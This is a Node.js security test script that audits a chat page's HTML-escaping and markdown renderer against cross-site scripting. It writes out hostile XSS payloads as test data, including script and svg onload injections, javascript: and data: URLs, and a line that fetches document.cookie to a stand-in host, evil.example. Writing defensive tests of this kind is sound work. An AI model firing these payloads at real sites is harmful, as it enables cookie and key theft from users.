#!/usr/bin/env node
/**
 * XSS audit for the Breakup Recovery Squad Browser Edition (browser/index.html).
 *
 * Loads the real page into jsdom (executing its actual inline script), then
 * feeds hostile model-output payloads through the page's own esc()/md()
 * rendering pipeline and verifies none of them produce live scripts, event
 * handlers, dangerous elements, or javascript:/data: URLs.
 *
 * Covered vectors:
 *   1. attribute injection — a model-supplied link URL containing quotes
 *      must not break out of href="..." (key-exfiltration path)
 *   2. <script> tags
 *   3. <svg onload=...>
 *   4. <iframe>
 *   5. javascript: URLs in markdown links
 *   6. data: URLs in markdown links
 *   7. <form action=...>
 *   8. <base href=...>
 *
 * Usage:
 *   cd starter_ai_agents/ai_breakup_recovery_agent/tests
 *   npm install
 *   node xss-audit.js [path/to/index.html]     # default: ../browser/index.html
 *
 * Exit code is non-zero if any vector succeeds or a static check fails.
 */
"use strict";

const fs = require("fs");
const path = require("path");
const { JSDOM } = require("jsdom");

const target = process.argv[2] || path.join(__dirname, "..", "browser", "index.html");
const html = fs.readFileSync(target, "utf8");

let failures = 0;
const pass = name => console.log(`  PASS  ${name}`);
const fail = (name, detail) => {
  failures++;
  console.log(`  FAIL  ${name}`);
  for (const line of String(detail).split("\n")) console.log(`        ${line}`);
};

/* ── static checks on the page source ───────────────────────────────────── */
console.log(`Auditing: ${target}\n`);
console.log("Static checks:");

const CSP_EXPECTED =
  "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; " +
  "img-src 'self' data: blob:; connect-src https://openrouter.ai; " +
  "base-uri 'none'; form-action 'none'; object-src 'none'";

{
  const escFn = html.match(/function esc\(s\)\{[^}]*\}/);
  if (!escFn) {
    fail("esc() defined", "no esc() function found in page source");
  } else {
    const src = escFn[0];
    const missing = [];
    if (!src.includes('replace(/"/g,"&quot;")')) missing.push('" → &quot;');
    if (!src.includes("replace(/'/g,\"&#39;\")")) missing.push("' → &#39;");
    if (!src.includes('replace(/&/g,"&amp;")')) missing.push("& → &amp;");
    if (!src.includes('replace(/</g,"&lt;")')) missing.push("< → &lt;");
    if (!src.includes('replace(/>/g,"&gt;")')) missing.push("> → &gt;");
    if (missing.length) {
      fail("esc() escapes & < > \" '", `missing: ${missing.join(", ")}\nfound: ${src}`);
    } else {
      pass("esc() escapes & < > \" '");
    }
  }
}

{
  const cspTag = `<meta http-equiv="Content-Security-Policy" content="${CSP_EXPECTED}">`;
  if (!html.includes(cspTag)) {
    fail("CSP meta tag present", "expected exact tag not found:\n" + cspTag);
  } else if (html.indexOf(cspTag) < html.indexOf('<meta name="viewport"')) {
    fail("CSP meta tag present", "CSP meta tag found but not after the viewport meta");
  } else {
    pass("CSP meta tag present (after viewport meta)");
  }
}

{
  const refTag = `<meta name="referrer" content="no-referrer">`;
  html.includes(refTag) ? pass("referrer meta is no-referrer") : fail("referrer meta is no-referrer", refTag + " not found");
}

/* ── dynamic checks: run hostile payloads through the page's own renderer ── */
console.log("\nDynamic checks (hostile model output through esc()/md()):");

// Load the real page with its inline script executed. jsdom ignores CSP, which
// is exactly what we want here: the renderer must be safe on its own.
const dom = new JSDOM(html, {
  runScripts: "dangerously",
  url: "https://venomous-101.github.io/Nebula/starter_ai_agents/ai_breakup_recovery_agent/browser/",
});
const win = dom.window;

if (typeof win.esc !== "function" || typeof win.md !== "function") {
  fail("page script loaded", "esc()/md() not reachable on window — page failed to execute");
  console.log(`\n${failures} failure(s)`);
  process.exit(1);
}

// Unit check on esc() itself.
{
  const probe = `"'<svg/onload=alert(document.cookie)>'`;
  const out = win.esc(probe);
  const raw = out.match(/[<>"']/g);
  if (raw) {
    fail("esc() neutralises quote/angle probe", `raw ${JSON.stringify([...new Set(raw)])} survived: ${out}`);
  } else if (!out.includes("&quot;") || !out.includes("&#39;") || !out.includes("&lt;")) {
    fail("esc() neutralises quote/angle probe", `entities missing: ${out}`);
  } else {
    pass("esc() neutralises quote/angle probe");
  }
}

const FORBIDDEN_ELEMENTS = ["script", "svg", "iframe", "form", "base", "object", "embed", "link", "meta", "style"];
const DANGEROUS_SCHEME = /^\s*(javascript|data|vbscript):/i;
const URL_ATTRS = ["href", "src", "action", "formaction", "xlink:href", "background", "poster"];

/** Parse rendered HTML into a fresh document and sweep it for live XSS. */
function sweep(renderedHtml) {
  const doc = new JSDOM(`<body>${renderedHtml}</body>`).window.document;
  const problems = [];
  for (const tag of FORBIDDEN_ELEMENTS) {
    const found = doc.getElementsByTagName(tag);
    if (found.length) problems.push(`<${tag}> element survived (${found.length})`);
  }
  for (const el of doc.querySelectorAll("*")) {
    for (const attr of el.attributes) {
      if (/^on/i.test(attr.name)) {
        problems.push(`live event handler ${attr.name}="${attr.value}" on <${el.tagName.toLowerCase()}>`);
      }
      if (URL_ATTRS.includes(attr.name.toLowerCase()) && DANGEROUS_SCHEME.test(attr.value)) {
        problems.push(`dangerous URL scheme in ${attr.name}="${attr.value.slice(0, 80)}"`);
      }
    }
  }
  return { doc, problems };
}

function runVector(name, payload, extraChecks) {
  let rendered;
  try {
    rendered = win.md(payload);
  } catch (e) {
    return fail(name, `md() threw: ${e.message}`);
  }
  const { doc, problems } = sweep(rendered);
  if (extraChecks) extraChecks(doc, rendered, problems);
  if (problems.length) fail(name, problems.join("\n") + `\nrendered: ${rendered.slice(0, 400)}`);
  else pass(name);
}

/* 1 — attribute injection: quote in URL must not break out of href="..." */
{
  // No ')' inside: the page's tiny link regex stops at the first ')', which
  // would only truncate the URL (a rendering quirk, not an injection).
  const hostileUrl = `https://evil.example/steal"onmouseover="alert(document.cookie`;
  runVector(
    "attribute injection: quote cannot escape href",
    `Recovery tips here: [click me](${hostileUrl}) — you got this!`,
    (doc, rendered, problems) => {
      const a = doc.querySelector("a");
      if (!a) return problems.push("expected a link to render, found none");
      if (a.getAttribute("href") !== hostileUrl) {
        problems.push(`href mangled — got "${a.getAttribute("href")}"`);
      }
      const unexpected = [...a.attributes].map(x => x.name).filter(n => !["href", "target", "rel"].includes(n));
      if (unexpected.length) problems.push(`anchor gained attributes: ${unexpected.join(", ")}`);
    }
  );
}

/* same vector with a single quote + autofocus style probe */
runVector(
  "attribute injection: single quote is entity-encoded",
  `[link](https://evil.example/'autofocus'onfocus='alert(1))`,
  (doc, rendered, problems) => {
    if (rendered.includes("'autofocus")) problems.push("raw single quote interpolated into markup");
  }
);

/* 2 — script tag */
runVector(
  "script tag is escaped",
  `Be kind to yourself.\n<script>window.__pwned=document.cookie</script>\nRest well.`,
  (doc, rendered, problems) => {
    if (!rendered.includes("&lt;script&gt;")) problems.push("<script> not visibly escaped");
  }
);

/* 3 — svg onload */
runVector("svg onload is escaped", `Day 1: no checking their profile. <svg onload="alert(document.cookie)"><circle r="40"/></svg>`);

/* 4 — iframe */
runVector("iframe is escaped", `Try this: <iframe src="https://evil.example/phish" width="1" height="1"></iframe>`);

/* 5 — javascript: URL (markdown link regex only allows https?:) */
runVector(
  "javascript: URL is not linkified",
  `[free money](javascript:fetch('https://evil.example/k?c='+document.cookie))`,
  (doc, rendered, problems) => {
    if (doc.querySelector("a")) problems.push("javascript: payload became a link");
    if (/javascript:/i.test(rendered) === false) problems.push("payload vanished unexpectedly (should remain visible text)");
  }
);

/* 6 — data: URL */
runVector(
  "data: URL is not linkified",
  `[open](data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+)`,
  (doc, rendered, problems) => {
    if (doc.querySelector("a")) problems.push("data: payload became a link");
  }
);

/* 7 — form action */
runVector(
  "form action is escaped",
  `<form action="https://evil.example/steal"><input name="key" value="sk-or-v1-SECRET"><button>claim</button></form>`
);

/* 8 — base href */
runVector("base href is escaped", `<base href="https://evil.example/">`);

/* bonus — combined kitchen-sink payload, as a hostile model might emit */
runVector(
  "combined payload stays inert",
  [
    `## Sorry things ended this way`,
    `Read [this](https://evil.example/"onclick="alert(1)) first.`,
    `<script>alert(1)</script> <svg onload=alert(2)> <iframe src=//evil.example></iframe>`,
    `<form action=//evil.example><input name=key></form> <base href=//evil.example/>`,
    `[js](javascript:alert(3)) [data](data:text/html,x)`,
  ].join("\n")
);

console.log(failures ? `\n✗ ${failures} check(s) FAILED` : `\n✓ All XSS audit checks passed`);
process.exit(failures ? 1 : 0);
